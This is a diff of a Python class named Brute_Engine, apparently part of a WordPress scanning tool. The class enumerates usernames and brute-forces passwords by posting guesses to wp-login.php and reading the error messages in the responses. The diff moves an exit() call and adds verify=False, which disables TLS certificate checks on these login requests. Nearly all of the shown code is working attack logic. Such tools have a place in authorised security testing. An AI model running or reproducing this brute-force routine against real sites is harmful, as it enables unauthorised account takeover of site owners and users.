@@ -30,9 +30,9 @@ class Brute_Engine:
 					print notice("Bruteforcing " + brute)
 					print info("User found "+ brute)
 					self.bruteforcing_pass(wordpress, brute)
-
-		# Exit after the bruteforce
-		exit()
+					
+			# Exit the bruteforce
+			exit()
 
 	"""
 	name        : bruteforcing_user(self, wordpress)
@@ -47,7 +47,7 @@ class Brute_Engine:
 			for user in data:
 				user = user.strip()
 				data = {"log":user, "pwd":"wordpresscan"}
-				if not "Invalid username" in requests.post(wordpress.url + "wp-login.php", data=data).text:
+				if not "Invalid username" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
 					print info("User found "+ user)
 					self.bruteforcing_pass(wordpress, user)
 
@@ -69,6 +69,6 @@ class Brute_Engine:
 
 				print 'Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' ) ,
 
-				if not "The password you entered" in requests.post(wordpress.url + "wp-login.php", data=data).text:
+				if not "The password you entered" in requests.post(wordpress.url + "wp-login.php", data=data, verify=False).text:
 					print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
 					break
